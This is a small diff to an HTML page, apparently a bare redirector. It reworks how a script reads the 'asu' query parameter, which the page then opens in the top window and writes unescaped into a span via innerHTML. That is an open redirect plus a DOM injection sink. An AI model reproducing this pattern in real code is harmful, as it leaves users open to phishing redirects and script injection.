@@ -4,14 +4,14 @@
 </head>
 <body>
 <script type="text/javascript">
-document.onload(function() {
-var url_string = window.location.href;
-var url = new URL(url_string);
-var rigan = url.searchParams.get("asu");
+var vars = {};
+    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+        vars[key] = value;
+    });
+var rigan = vars["asu"];
 window.open(rigan, '_top');
 
 document.getElementById('anjing').innerHTML = rigan;
-});
 </script>
 <span id="anjing"></span>
 ASU BOSS
